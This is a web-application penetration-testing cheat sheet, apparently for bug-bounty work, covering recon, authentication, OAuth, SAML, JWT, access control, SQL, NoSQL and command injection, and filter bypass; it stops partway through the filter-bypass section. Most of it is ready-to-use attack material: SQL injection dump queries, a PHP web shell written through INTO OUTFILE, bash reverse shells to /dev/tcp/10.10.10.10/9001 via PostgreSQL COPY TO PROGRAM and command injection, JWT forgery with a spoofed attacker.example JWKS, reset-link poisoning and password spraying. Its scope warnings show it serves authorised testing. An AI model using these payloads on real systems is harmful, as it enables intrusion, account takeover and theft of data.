# Web cheatsheet

If you are stuck, you skipped a checkbox.

Do not start with a vulnerability scanner and then "manually verify". Start with the app study.

Source code available? The white-box method is in [[whitebox_cheatsheet]].

---

## Contents

- [Hunting checklist](#hunting-checklist)
- [Toolbox](#toolbox)
- [Recon](#recon)
- [Content discovery](#content-discovery)
- [Reading the app](#reading-the-app)
- [Registration, login, reset, 2FA](#registration-login-reset-2fa)
- [OAuth](#oauth)
- [SAML](#saml)
- [JWT](#jwt)
- [Access control](#access-control)
- [SQL injection](#sql-injection)
- [NoSQL injection](#nosql-injection)
- [OS command injection](#os-command-injection)
- [Filter bypass](#filter-bypass)
- [SSTI](#ssti)
- [CSTI](#csti)
- [XXE](#xxe)
- [XSLT](#xslt)
- [XPath / LDAP / CRLF](#xpath--ldap--crlf)
- [XSS](#xss)
- [CSRF](#csrf)
- [Clickjacking](#clickjacking)
- [CORS](#cors)
- [Open redirect](#open-redirect)
- [Path traversal, LFI, RFI](#path-traversal-lfi-rfi)
- [File upload](#file-upload)
- [SSRF](#ssrf)
- [API and GraphQL](#api-and-graphql)
- [WebSockets](#websockets)
- [Cookies and sessions](#cookies-and-sessions)
- [Deserialisation and ViewState](#deserialisation-and-viewstate)
- [Prototype pollution](#prototype-pollution)
- [Encryption](#encryption)
- [HTTP request smuggling](#http-request-smuggling)
- [Cache poisoning](#cache-poisoning)
- [Race conditions](#race-conditions)
- [Host header and extra headers](#host-header-and-extra-headers)
- [Misconfig](#misconfig)
- [WordPress](#wordpress)
- [Fingerprinting](#fingerprinting)
- [Payload lists worth bookmarking](#payload-lists-worth-bookmarking)

---

## Hunting checklist

Run this on every target. The later sections are how, not whether.

### Discovery

- [ ] Stay in scope. Write the in-scope names down before you scan.
- [ ] ASN and IP ranges for the org. Company-owned space is often more interesting than the Cloudflare VIP.
- [ ] Subdomains and related domains. Full pipeline: [[web_attack_surface_recon]]
- [ ] Resolve, then port-scan the live names. Banner-grab anything that is not 80/443.
- [ ] Subdomain / domain takeover if the program allows claiming (dangling CNAME, unclaimed SaaS, NS on a domain you could buy).
- [ ] If the edge is Cloudflare / Akamai / Fastly, try to find origin IPs: historical DNS, mail headers, JS error pages, other hostnames on the same cert, scans of the org ASN. Hit origin only if that is in scope.
- [ ] Screenshot a large scope (`gowitness` / `eyewitness`). You will not click 800 tabs by hand.
- [ ] TLS: expired certs, old protocols, name mismatch, admin panels on weird vhosts.

### OSINT

- [ ] Wayback / `gau` / `waymore` for old paths, parameters, forgotten apps.
- [ ] Google / GitHub dorks for the company name, the apex, and unique strings from JS.
- [ ] Employee credential dumps (only to test *in-scope* login panels, and only if the program allows it).
- [ ] Company GitHub / GitLab / Bitbucket: secrets, `.env`, internal hostnames, forgotten forks.
- [ ] Third-party apps (Slack, Zendesk, Jira, Grafana, Jenkins, S3, Firebase) if they are in scope.

### Unauthenticated

For each live service:

- [ ] Name and version. CVE-search anything you can prove, do not spray every nuclei template at prod on day one.
- [ ] Login panels. Default creds, leftover `admin:admin`, credential stuffing if the rules allow it. Do not lock accounts.
- [ ] Read HTML / JS / CSS. Secrets, hidden routes, feature flags, source maps (`app.js.map`).
- [ ] HTTP request smuggling (especially HTTP/1 backends behind a reverse proxy).
- [ ] Extra headers: `X-Forwarded-For`, `X-Forwarded-Host`, `X-Original-URL`, `X-Rewrite-URL`, `Forwarded`.
- [ ] External includes you can influence (script src, webhook, PDF renderer, image proxy).
- [ ] Content discovery: backups, `.git`, `.env`, `server-status`, `phpinfo`, admin, API docs.
- [ ] Break a parameter on purpose. Stack traces are a gift.
- [ ] Debug / TRACE / TRACK methods. `PUT` / `DELETE` on static hosts.
- [ ] Security headers: CSP, `X-Frame-Options` / `frame-ancestors`, HSTS, cookie flags. Missing headers alone are rarely a finding; they tell you what is easier.
- [ ] Source or firmware available? Read it. Guessing is slower.

### Registration

- [ ] Injection in every field: SQLi, NoSQL, XML, JSON.
- [ ] Second-order: name / email / company stored now, exploded later in an admin panel, PDF, ticket, or log (XSS, SSTI, command).
- [ ] Same payload in the welcome email (HTML injection, SSTI in the mail template).
- [ ] User enumeration (`email already registered` vs generic error).
- [ ] Registration flood — only if it will not take the app down.
- [ ] `next=` / `returnUrl=` / `redirect=` after signup.

### Login

- [ ] OAuth / SSO — see [OAuth](#oauth) and [SAML](#saml).
- [ ] Default and leaked passwords. Spray, do not brute a single account into lockout.
- [ ] Change the user id / email in the login body or in a hidden field. Some apps authenticate one user and bind the session to another.
- [ ] Injection in the login fields and in `Host` / `X-Forwarded-Host` (password reset and magic links often copy those).
- [ ] User enumeration on login vs on reset vs on register. Timing counts.
- [ ] Open redirect after login (`?next=https://attacker.example`).
- [ ] 2FA — see [2FA](#2fa).

### Password reset

- [ ] Host header poisoning of the reset link.
- [ ] Token in the URL, in the body, in a referrer, in a log.
- [ ] Token entropy: is it a user id, an email, a JWT, `md5(email)`, a 4-digit PIN?
- [ ] Flip a byte or change the length. Padding / cipher errors mean you are looking at encrypted tokens, not random ones.
- [ ] Race two reset requests, use the first link and the second.
- [ ] Reset token reuse after a successful reset. Reset token bound to the account, or just to "whoever clicks"?

### With an account

- [ ] Map roles. For every privileged action, replay it as a lower user and as nobody. That is most of access control.
- [ ] Cookie flags: `Secure`, `HttpOnly`, `SameSite`, `Domain`, `Path`.
- [ ] CSRF on every state-changing request. JSON and bearer tokens change the picture — still check.
- [ ] Session cookie contents. If it is not a random blob, decode it.
- [ ] Session fixation (set a cookie, log in, see if it stays).
- [ ] Same cookie accepted on another app / vhost / environment.
- [ ] JWT / SAML / ViewState — their own sections.
- [ ] Logout actually kills the session. JWT often does not. Expired `exp` still accepted.

### Manual inspection

Input:

- [ ] SSTI / SSI / ESI
- [ ] Reflected, stored, DOM XSS
- [ ] HTML in PDF generation (SSRF / LFI via the renderer)
- [ ] Command injection (`` ; | & ` $() ``)
- [ ] Deserialisation
- [ ] XML and JSON parsers on the same endpoint
- [ ] XXE
- [ ] CRLF / header injection
- [ ] XPath, LDAP
- [ ] Mass assignment

Files:

- [ ] html / svg / xml upload → XSS
- [ ] php / aspx / jsp / cgi / xhtml
- [ ] Extension and content-type bypass
- [ ] Image processors (ImageMagick, Ghostscript, SVG → local file)
- [ ] SSRF, IDOR, LFI, path traversal on download endpoints

API:

- [ ] CORS, CSRF, IDOR, missing auth
- [ ] Other versions (`/v1` vs `/v2`) and other verbs
- [ ] JSON weirdness (duplicate keys, `[{}]` vs `{}`, prototype pollution)
- [ ] SOAP / GraphQL sitting next to the REST you found
- [ ] WebSocket messages. Every field is a parameter nobody scanned
- [ ] Race conditions

Cache:

- [ ] Unkeyed headers, cache deception, fat GET

---

## Toolbox

| Job | Tool |
|---|---|
| proxy | Burp, with Collaborator (or `interactsh-client` when you have no Pro licence) |
| Burp extensions | Autorize, Param Miner, HTTP Request Smuggler, Turbo Intruder, SAML Raider, InQL, DOM Invader |
| names, ports, live hosts | `subfinder`, `dnsx`, `naabu`, `httpx`, `gowitness` |
| content and parameters | `ffuf`, `dirsearch`, `gobuster`, `git-dumper` |
| URL history | `gau`, `waymore`, `unfurl` |
| SQL injection | `sqlmap` (after you confirmed by hand) |
| tokens and sessions | `jwt_tool`, `hashcat`, `flask-unsign` |
| deserialisation | `ysoserial`, `ysoserial.net`, `phpggc` |
| template injection | `SSTImap` |
| crypto | `padbuster` / `padre`, `hashpump` |
| WebSockets | Burp WebSockets history, `websocat` |
| CMS | `wpscan` |
| fingerprinting | `nuclei -tags tech`, `whatweb` |

---

## Recon

For a *single* host you already have, skip to [Content discovery](#content-discovery). For a company / wildcard program, do the full pipeline in [[web_attack_surface_recon]] and only then come back here.

Quick and dirty when you just need names and ports:

```bash
D=example.com

subfinder -all -t 50 -d "$D" | tee subdomains.txt
curl -s "https://crt.sh/?q=%25.$D&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u

dnsx -l subdomains.txt -a -resp -silent | tee resolved.txt
dnsx -l subdomains.txt -a -resp-only -silent | sort -u > ips.txt

# origin-ish ranges (skip if everything is Cloudflare)
asnmap -i "$(head -1 ips.txt)" -silent | mapcidr -silent > asn_cidrs.txt

naabu -l ips.txt -tp 1000 -rate 500 -silent -o ports.txt   # ip:port
httpx -l subdomains.txt -silent -o live_urls.txt
httpx -l live_urls.txt -sc -title -td -cdn -silent -o httpx.txt

gowitness scan file -f live_urls.txt --threads 20 --write-db
gowitness report server 127.0.0.1:7171
```

Masscan on ranges you own in the engagement (not on a CDN anycast):

```bash
sudo masscan -iL asn_cidrs.txt --top-ports 1000 --rate 10000 --open --randomize-hosts -oG ports-grep.txt
```

Then nmap only what is open, not the whole ASN:

```bash
while IFS=: read -r IP port; do
  nmap -p "$port" -T3 -n -Pn -sCV "$IP"
done < ports.txt | tee nmap-scan.txt
```

Historical URLs (old parameters are still the best parameters):

```bash
gau --subs "$D" | tee urls.txt                 # history, not the live list above
waymore -i "$D" -mode U -oU waymore_urls.txt
cat urls.txt waymore_urls.txt | unfurl keys | sort | uniq -c | sort -n
```

---

## Content discovery

Wordlists matter more than the tool. `common.txt` first, then bigger. Recursive only on directories that look like apps, not on `/static`.

```bash
# fast 200/300-ish
dirsearch -u https://victim.example -o dirb.txt --crawl \
  --user-agent='Mozilla/5.0' -t 40 -i 200,300-399 -r -f \
  -e html,php,asp,aspx,js,json,txt,bak,old,zip

ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt \
  -u https://victim.example/FUZZ -mc 200,204,301,302,307,401,403 \
  -H 'User-Agent: Mozilla/5.0' -t 40

gobuster dir -u https://victim.example \
  -w /usr/share/seclists/Discovery/Web-Content/common.txt
```

A sequence that does not waste an afternoon:

1. `dirb https://victim.example/ -r` (no recursion) — see the shape.
2. `gobuster` with `common.txt`.
3. Recurse into the interesting dirs with a bigger list and extensions.
4. Fuzz parameters and POST bodies with `ffuf`, not more directories.

```bash
ffuf -w /usr/share/seclists/Passwords/Common-Credentials/xato-net-10-million-passwords-1000.txt \
  -u https://victim.example/login.php \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'username=admin&password=FUZZ' \
  -fr 'Invalid'
```

Always try the boring files by hand:

```
/.git/HEAD
/.env
/backup.zip /www.zip /site.tar.gz
/server-status /server-info
/phpinfo.php /info.php
/swagger/index.html /openapi.json /api-docs
/actuator /actuator/env /actuator/health
/robots.txt /sitemap.xml /.well-known/security.txt
```

If `.git` is there:

```bash
git-dumper https://victim.example/.git/ ./git-dump
```

Loot a directory listing:

```bash
wget -r -np -R 'index.html*' https://victim.example/folder/
```

---

## Reading the app

Before you fuzz, read.

- View-source, then every `<script src>`. Download JS, beautify, grep.
- Source maps: `//# sourceMappingURL=app.js.map` — often the original TypeScript, with comments and internal URLs.
- DevTools → Network → look at XHR/fetch, not just page loads. That is the real API.
- DevTools → Debugger → Ctrl+F for `innerHTML`, `eval(`, `document.write`, `location.hash`, `postMessage`, `dangerouslySetInnerHTML`.
- Response headers: stack (`X-Powered-By`, `Server`), cookie flags, CSP, CORS.
- Error pages: add a `'`, a `{`, a huge URL, a bad `Content-Type`.

Grep JS for routes the UI never links:

```bash
grep -oE 'https?://[^"'\'' ]+' app.js | sort -u
grep -oE '(/api/|/v[0-9]+/)[^"'\'' ]+' app.js | sort -u
grep -iE 'secret|api[_-]?key|password|token|AKIA' app.js
```

---

## Registration, login, reset, 2FA

Treat every form as an injection point *and* a logic point. The same `email` field can be SQLi, XSS in the admin panel, and Host-header poisoning of a reset mail.

### User enumeration

Compare status, body length, and time:

```
POST /login
{"email":"exists@victim.example","password":"wrong"}     → 401, 48ms, "invalid password"
{"email":"nope@victim.example","password":"wrong"}       → 401, 12ms, "unknown user"
```

Same on `/register` and `/forgot`. Report it when it lets you build a valid-user list, not as a standalone "info" unless the program wants that.

### Auth bypass, cheap ones

```
user=admin'--
user=admin' or '1'='1
{"username": {"$ne": ""}, "password": {"$ne": ""}}
```

Default creds: `admin:admin`, `admin:password`, `test:test`, vendor defaults (Tomcat `tomcat:s3cret`, Jenkins empty password, Grafana `admin:admin`).

Hidden field / cookie swap during login:

```
POST /login
user=attacker&password=...&user_id=1
Cookie: preauth_user=admin
```

### Password reset

Steal or mint a link:

1. Request a reset for `victim@`.
2. Poison `Host` / `X-Forwarded-Host` so the email points at you:

```
POST /forgot HTTP/1.1
Host: attacker.example
X-Forwarded-Host: attacker.example

email=victim@victim.example
```

3. If the token looks like `base64(email|timestamp|hmac)`, decode it. If it looks like `md5(email)`, you can mint it. If it is 6 digits, Turbo Intruder it (only if lockout is absent and the program allows it).
4. Change the email in the *confirm* step to someone else's, keep your token:

```
POST /reset
token=YOUR_TOKEN&email=victim@victim.example&password=NewPass1
```

5. PHP backend comparing the token with `==`? Send `0`, or JSON `true`. See [[PHP Type Juggling and Magic Hashes]].

### Weak tokens

A reset token, session id, invite code or API key is only as good as the generator behind it. Request five for your own account and look at them side by side before anything else.

| What you see | What it probably is | Attack |
|---|---|---|
| 32 hex chars that change with the second | `md5(time())`, `md5(microtime())`, `md5(email . time())` | rebuild every value in a window around the server's `Date` header |
| 13 hex chars, increasing | PHP `uniqid()`: seconds and microseconds in hex | first 8 chars are the Unix time; brute the last 5 |
| digits or letters from PHP `mt_rand()` / `rand()` | Mersenne Twister with a 32-bit seed | recover the seed from one output with `php_mt_seed`, then predict |
| values from `java.util.Random` | 48-bit linear generator | two consecutive `nextInt()` or one `nextLong()` give the state; a time-seeded one falls to a millisecond brute force |
| `Math.random()` in Node | xorshift128+ | recoverable from a few outputs; hard, try everything else first |
| UUID with a `1` as the first digit of the third group | UUIDv1: timestamp and MAC | request one before and one after the victim's, brute the timestamps between |
| short numeric code | 4 to 6 digits | brute force, if nothing rate-limits it |

`uniqid()` and `rand()` being an alias of `mt_rand()` were both confirmed on PHP 7.4 and 8.3.

The pattern for time-based tokens:

1. Trigger the token for the victim. Keep the response: its `Date` header is the server's clock.
2. Generate every candidate for a couple of seconds either side (with milliseconds, that is a few thousand).
3. Try them against the reset endpoint.

Code for the window, and a `java.util.Random` predictor, is in [[Exploit skeleton (Python)]]. With source access you do not guess the formula, you read it: see [[whitebox_cheatsheet#Auth and session code]].

If you already have SQL injection, skip all of this and read the token out of the database.

### 2FA

Common holes, in the order you should try them:

1. After the password step, browse straight to `/dashboard`. Some apps only hide the UI.
2. Response rewrite in Burp: `"2fa_ok": false` → `true`, or HTTP 401 → 200.
3. The OTP is bound to nothing — submit an OTP from account A on account B's session.
4. Disable 2FA from `/account/2fa` without re-entering it.
5. Backup codes issued at setup never rotate; leak from an XSS or a support panel.
6. OAuth / "login with Google" lands you in a fully logged-in session and skips 2FA.
7. Brute a 6-digit OTP only when there is no lockout, no rate limit, and the rules allow it. 000000–999999 at 50 threads will get you a phone call from the client.

---

## OAuth

You care about the redirect, the `state`, the scopes, and whether the app mixes its own session with the IdP's.

Look at the authorize URL:

```
https://idp.example/authorize
  ?client_id=abc
  &redirect_uri=https://victim.example/callback
  &response_type=code
  &scope=openid email profile
  &state=...
```

Login bounces you to another host and back? That is OAuth. Ask the IdP what it supports before you poke at it:

```
/.well-known/openid-configuration
/.well-known/oauth-authorization-server
```

The answer lists the endpoints, the allowed `response_types`, and sometimes a `registration_endpoint`. If you can register a client yourself, every URL field in that request (`logo_uri`, `jwks_uri`, `sector_identifier_uri`) is a candidate for [SSRF](#ssrf).

Things that actually pay:

**`redirect_uri` not pinned.** Steal the code.

```
redirect_uri=https://attacker.example
redirect_uri=https://victim.example/callback/../../attacker.example
redirect_uri=https://victim.example.attacker.example
redirect_uri=https://attacker.example?https://victim.example/callback
redirect_uri=https://victim.example/callback%23https://attacker.example
```

Send the victim to your authorize URL. The IdP bounces them to you with `?code=`. Exchange it if you also have `client_secret` (often in a mobile app or an SPA). Even without the secret, some apps accept the code at `/callback` on a session you already opened.

**Missing or guessable `state`.** CSRF the callback: log the victim into *your* IdP account on the victim app (account takeover via binding), or bind their IdP to your app account.

**Scope upgrade.** Authorize with `scope=openid`, then exchange the code asking for `scope=openid email admin`. Some IdPs issue whatever you ask at the token step.

**`response_type=token` (implicit).** Token in the URL fragment. Leaks via `Referer`, browser history, XSS. Treat as a finding on anything that is not a pure SPA talking only to itself.

**Code reuse / no PKCE on a public client.** Replay the code from a mobile intercept.

**Mix-up.** App has several IdPs. Finish login on IdP A, send the code to the callback that talks to IdP B. The app may look up the wrong user.

When you have a code, the token request is just another API:

```
POST /oauth/token
Content-Type: application/x-www-form-urlencoded

grant_type=authorization_code
&code=CODE
&redirect_uri=https://victim.example/callback
&client_id=abc
&client_secret=...
```

---

## SAML

The app trusts an XML assertion from an IdP. If signature checks are lazy, you *are* the IdP.

Burp extension: SAML Raider. Save a login, tamper the assertion, resign or strip the signature.

**Signature not checked.** Change `NameID` to `admin@victim.example` and replay.

**Signature wrapping.** Valid signature stays on a dummy node; the app reads a second, unsigned `NameID`. SAML Raider has the wrapping payloads.

**Comment in the NameID** (parser disagrees with the canonicaliser):

```xml
<NameID>admin@victim.example<!---->.attacker.example</NameID>
```

IdP signs `admin@victim.example.attacker.example` (an account they will happily issue). App reads `admin@victim.example`.

**XXE in the SAML POST.** The ACS endpoint is an XML parser. See [XXE](#xxe).

**`algorithm` / `digest` downgrade.** SHA1 still accepted, or HMAC with a leaked secret.

You need a captured Response to work. Log in once with a real test IdP user, intercept `SAMLResponse=`, decode base64, pretty-print.

---

## JWT

Decode before you attack. Header and payload are just base64url.

```bash
python3 jwt_tool.py eyJhbGciOi...
# or: echo 'eyJhbGciOi...' | cut -d. -f1,2 | tr '_-' '/+' | while read x; do echo "$x====" | base64 -d; echo; done
```

Look at `alg`, `kid`, `jku`, `x5u`, `typ`, and claims: `sub`, `role`, `admin`, `scope`, `iss`, `aud`, `exp`.

**`alg: none`.** Strip the signature, set `"alg":"none"` (also try `None` / `NONE`). Some libraries accept a trailing dot with empty sig.

**Weak HMAC secret.**

```bash
hashcat -a 0 -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
python3 jwt_tool.py <token> -C -d /usr/share/wordlists/rockyou.txt
```

Then mint `role=admin`.

**Key confusion.** Token is RS256. Server has a public key (often at `/jwks.json` or baked into the mobile app). Send HS256 signed *with the public key as the HMAC secret*.

```bash
python3 jwt_tool.py <token> -X k -pk public.pem     # key confusion
python3 jwt_tool.py <token> -X a                     # alg:none variants
python3 jwt_tool.py <token> -X i                     # inject an inline JWK and sign with it
python3 jwt_tool.py <token> -X s -ju https://attacker.example/jwks.json    # spoofed JWKS
python3 jwt_tool.py <token> -I -pc role -pv admin -S hs256 -p 'cracked-secret'   # change a claim, re-sign
```

**`kid` tricks.**

```
{"alg":"HS256","kid":"../../dev/null"}          → HMAC with empty key
{"alg":"HS256","kid":"/app/secrets/hmac"}      → path
{"kid":"1' UNION SELECT 'secret'--"}           → SQL
```

**`jku` / `x5u` you control.** Point at your JWKS, sign with your key.

```
{"alg":"RS256","jku":"https://attacker.example/jwks.json"}
```

**Claim tampering without breaking the sig** — only works if the server does not verify, or verifies a different field. Still try `exp` in the past, `aud` swapped to another app, `sub` swapped to another user. Autorize is faster than thinking here.

---

## Access control

This is the most common real finding and the one novices skip because there is no payload. Two accounts, Burp, replay.

- **Horizontal:** user A's object id in user B's session (`/invoices/1822`, `/api/users/5/email`).
- **Vertical:** user hits `/admin/deleteUser` or `POST /api/admin/settings`.
- **Unauth:** drop the cookie. Many "authenticated" APIs do not check.

IDs hide in more than the URL: JSON body, XML, cookies, `X-User-Id`, WebSocket frames, the filename of an export, the `sub` of a JWT.

```
GET /api/users/123          → your profile
GET /api/users/1            → admin
GET /api/users/124          → neighbour
GET /api/users/123          as anonymous
POST /api/users/123         with {"role":"admin"}          ← mass assignment
PUT /api/users/123          vs PATCH vs POST vs POST /api/users/123.json
```

If the id is a UUID, do not assume it is safe. UUIDs leak in emails, exports, JS, `Referer`. Sequential ints are nicer, not required.

Parameter pollution / wrapping:

```
id=1&id=2
{"id": [1, 2]}
{"id": {"id": 1}}
```

Change the path, keep the auth:

```
/api/v1/admin/users     → 403
/api/v2/admin/users     → 200
/api/v1/Admin/users     → 200
/api/v1/admin/users/    → 200
/static/../api/v1/admin/users
X-Original-URL: /api/v1/admin/users
```

Mass assignment: add fields the UI never sends.

```json
{"email":"me@x","role":"admin","isAdmin":true,"verified":true,"balance":99999}
```

Rails / Laravel / Node apps with `User.update(req.body)` are the usual victims.

---

## SQL injection

Entry: break the query. If the page changes, errors, or slows down, you are in.

```
'
"
')
';
';--
'--
' OR 1=1--
' OR '1'='1
1 OR 1=1
1 AND 1=2
%27 %22 %23
%%2727
```

URL-encode in Burp (`Ctrl+U`). XML bodies want `&apos;`.

Confirm with a true/false pair, not with a random error:

```
/item?id=1 AND 1=1
/item?id=1 AND 1=2
```

### Comments, by engine

```
--     (MySQL needs a space: --[space])
#      MySQL
/* */  most
;      stacked (MSSQL, PostgreSQL, sometimes MySQL if enabled)
```

### Union

Find column count (`ORDER BY n` until it dies, or `UNION SELECT NULL,NULL,...`), then find which columns print:

```
1 UNION SELECT NULL,NULL,NULL--
1 UNION SELECT 1,2,3--
1 UNION SELECT 1,database(),3--
```

MySQL dump sketch:

```sql
UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()--
UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='users'--
UNION SELECT 1,group_concat(user,0x3a,pass),3 FROM users--
```

### Error based

When the app prints database errors, make the error carry the data. One request per value.

```
# PostgreSQL
' AND 1=CAST((SELECT version()) AS int)--
# MySQL
' AND extractvalue(1,concat(0x7e,(SELECT version())))-- -
# MSSQL
' AND 1=CONVERT(int,(SELECT @@version))--
```

The PostgreSQL line was run on 16; the other two are from the PortSwigger sheet.

### Boolean (blind)

No output and no error, but the page differs between true and false. Ask one yes/no question per request and binary-search each character:

```
1 AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1) FROM 1 FOR 1))>77
```

`SUBSTRING(x FROM n FOR 1)` works on PostgreSQL and MySQL. MSSQL wants `SUBSTRING(x,n,1)`, Oracle and SQLite `SUBSTR(x,n,1)`. Seven requests per character; nobody does this by hand. The loop is in [[Exploit skeleton (Python)]].

### Time based (blind)

Use the right sleep for the engine:

```
# MySQL
' OR IF(1=1,SLEEP(5),0)--
' OR IF(LENGTH(database())>1,SLEEP(5),0)--

# MSSQL
'; WAITFOR DELAY '0:0:5'--
1; IF (1=1) WAITFOR DELAY '0:0:5'--

# PostgreSQL
'; SELECT pg_sleep(5)--
1 AND (SELECT pg_sleep(5)) IS NULL--

# Oracle
' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5) IS NOT NULL--
```

Out of band when you have Collaborator and `xp_dirtree` / `copy` / `LOAD_FILE` / `UTL_HTTP`.

### Not in a WHERE clause

The injection point decides the payload. All three were run on PostgreSQL 16:

```
# ORDER BY: no UNION possible, so make the false case an error
?sort=(CASE WHEN (1=1) THEN 1 ELSE 1/(SELECT 0) END)

# LIMIT
?limit=(SELECT CASE WHEN (1=1) THEN 1 ELSE 0 END)

# INSERT / UPDATE value: you are inside a string in a value list
name=a'||(SELECT CASE WHEN (1=1) THEN pg_sleep(3) END)||'b
name=a'||(SELECT version())||'b          → stored, shown wherever the name is displayed
```

Second-order: the value is stored safely and concatenated into a different query later (a report, an admin list, a nightly job). The request that injects is not the request that fires. With source, grep for queries built from columns you can write.

### Stacked / RCE-ish

MSSQL (if `xp_cmdshell` can be turned on — noisy, ask before you do this on a client DB):

```sql
'; EXEC sp_configure 'show advanced options',1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;
EXEC master.dbo.xp_cmdshell 'whoami';--
```

MySQL file read / write (needs `FILE` privilege and a writable web root):

```sql
UNION SELECT LOAD_FILE('/etc/passwd')--
UNION SELECT '<?php system($_GET["c"]);?>' INTO OUTFILE '/var/www/html/cmd.php'--
```

PostgreSQL, as a superuser with stacked statements:

```sql
'; CREATE TABLE o(l text); COPY o FROM PROGRAM 'id'; --
'; COPY (SELECT 1) TO PROGRAM 'bash -c "bash -i >& /dev/tcp/10.10.10.10/9001 0>&1"'; --
```

File read and write, large objects, and a C function you upload when `COPY … PROGRAM` is not an option: [[PostgreSQL SQLi to RCE]].

### sqlmap

Confirm by hand first, then:

```bash
sqlmap -u 'https://victim.example/item.php?id=1' --batch --dbs
sqlmap -u 'https://victim.example/class.php' \
  --data='weight=12&height=1&age=1&gender=M&email=a@b.com' \
  -p email --level=3 --risk=2 --dbs

# authenticated
sqlmap -u 'https://victim.example/search' --cookie='session=...' -p q
```

`--os-shell` is a last resort, not a first click.

PortSwigger's SQL sheet is the one to keep open: https://portswigger.net/web-security/sql-injection/cheat-sheet

---

## NoSQL injection

Mongo, Redis-backed query builders, anything that takes JSON and drops it into a query. Identify the stack first (`X-Powered-By`, error text, `mongo` in JS). The *workflow* is the same as SQL: break, then boolean, then extract.

Fuzz:

```bash
ffuf -w /usr/share/seclists/Fuzzing/Databases/SQLi/NoSQL.txt \
  -X POST -d 'username=admin&password=FUZZ' \
  -u https://victim.example/login -fc 401
# fallback: PayloadsAllTheThings/NoSQL Injection/Intruder/NoSQL.txt
```

Quick and dirty characters (URL-encode them):

```
'"`{
;$Foo}
'\"`{\r;$Foo}\n$Foo \\xYZ\u0000
```

True / false:

```
/?filter=' && 0 && '
/?filter=' || 1 || '
/?filter=' || 1 %00
```

Operators. GET cannot always send `[]`; switch to POST or JSON.

| op | meaning |
|---|---|
| `$ne` | not equal |
| `$gt` `$lt` | greater / less |
| `$regex` | regex |
| `$in` `$nin` | in / not in |
| `$where` | JS on the server. Gold. |

Auth bypass, form:

```
POST /login
Content-Type: application/x-www-form-urlencoded

username[$ne]=x&password[$ne]=x
```

JSON:

```json
{"username":{"$ne":"x"},"password":{"$ne":"x"}}
```

Regex extract (password starts with `a`, then `ad`, ...):

```json
{"username":"admin","password":{"$regex":"^a"}}
```

`$where` — if this runs, you have JS in the database:

```
admin' && this.password[0]=='a' || 'a'=='b
```

or add `{"$where":"1"}` next to the other fields. From there it is blind SQLi with JS, character by character.

`sleep(5000)` inside `$where` is a decent confirm on Mongo.

---

## OS command injection

The backend glued your parameter into a shell. Classic: ping, convert, backups, image magick, "test connection".

```python
# this is the bug
command = f"ping -c 1 {user_ip}"
subprocess.run(command, shell=True)
```

Break out, then prove it with a delay or a collab hit before you drop a shell.

```
; id
| id
|| id
&& id
`id`
$(id)
%0a id
; ping -c 3 YOUR-COLLAB
; nslookup YOUR-COLLAB
```

Windows:

```
& whoami
| whoami
&& ping /n 5 127.0.0.1
```

Blind: `sleep 5` / `ping -c 5`. Out of band beats guessing.

Reverse shell only after you know the injection works. URL-encode the whole thing (`Ctrl+U`).

```
8.8.8.8; bash -c 'bash -i >& /dev/tcp/10.10.10.10/9001 0>&1'
```

Listener: `nc -lvnp 9001`. WAF in the way: base64 the inner command, or split it (`wh''oami`, `${IFS}`). More in [Filter bypass](#filter-bypass).

---

## Filter bypass

A filter is code, and it has bugs like any other code. With source, read the exact regex or character list and find the input it lets through. Without source, send one character class at a time and note what dies.

Everything in this section was run (PHP 7.4 and 8.3, Python 3, Node, bash) unless marked.

### Regex mistakes

| Mistake | Example check | What passes |
|---|---|---|
| No anchors | `preg_match('/[a-z]+/', $x)`, Python `re.match(r'\d+', x)` | `abc;id`, `123;id`: one matching piece anywhere is enough |
| `$` allows a trailing newline | PHP `/^[a-z]+$/`, Python `re.match(r'^\d+$', x)` | `abc%0a`. PHP needs the `D` flag or `\z`; Python needs `fullmatch` or `\Z`. JavaScript `$` is strict |
| Multiline flag | `/^admin$/m` in PHP, Python or JS | `x%0aadmin`: any one line may match |
| `.` does not match a newline | blacklist `/select.+from/i` | `select%0afrom` is not seen (unless the `s` flag is set) |
| Unescaped dot | `^https://victim.example/` | `https://victimXexample/` |
| `preg_match` returns `false` on error | `if (preg_match($bad, $x)) die();` | input that hits the backtrack limit (`/^(a+)+$/` against 5000 `a` and a `!`) returns `false`, which reads as "clean". On PHP 7 an array (`x[]=`) does the same; PHP 8 throws |
| Global regex reused | JS `const r = /^admin$/g; r.test(x)` | the same input alternates true, false, true: send it twice |
| Replace runs once | `str_replace('../', '', $p)`, JS `s.replace('<script>', '')` | `....//` becomes `../`; JS string replace only removes the first hit |
| Case | `in_array($ext, ['php'])`, `pathinfo()` | `shell.pHp`: neither lowercases for you |

### Order of operations

The filter sees one form, the sink another:

- **Check, then decode.** Filter on the raw value, `urldecode` afterwards: `%2527` is `%27` at the filter and `'` at the query. Same idea with base64, JSON `'`, HTML entities.
- **Check, then normalise.** Case mapping and Unicode normalisation create characters that were not there: `ı` uppercases to `I`, `ſ` to `S`, the Kelvin sign `K` lowercases to `k`, and NFKC turns fullwidth `＜script＞` into `<script>`.
- **Check one type, use another.** `x[]=` arrives as an array, JSON `true` as a boolean. See [[PHP Type Juggling and Magic Hashes]].

### No quotes, spaces, commas or parentheses

SQL (PostgreSQL forms run on 16; more in [[PostgreSQL SQLi to RCE]]):

```sql
SELECT $$admin$$                           -- PostgreSQL string without quotes
SELECT CHR(97)||CHR(100)                   -- PostgreSQL / Oracle
SELECT 0x61646d696e                        -- MySQL hex string (not run here)
SELECT/**/1          SELECT(1)WHERE(1=1)   -- no spaces; %09 and %0a also separate
SUBSTRING(x FROM 1 FOR 1)                  -- no comma
LIMIT 1 OFFSET 2                           -- no comma
SELECT * FROM (SELECT 1)a CROSS JOIN (SELECT 2)b   -- two columns without a comma
```

Shell:

```bash
cat${IFS}/etc/passwd            # no space
{cat,/etc/passwd}               # no space
cat</etc/passwd                 # no space
X=$'\x2fetc\x2fpasswd';cat $X   # no slash
${HOME:0:1}                     # a slash from a variable
w''hoami   w""hoami   who\ami   # break up a blacklisted word
/usr/bin/wh?ami                 # glob instead of the name
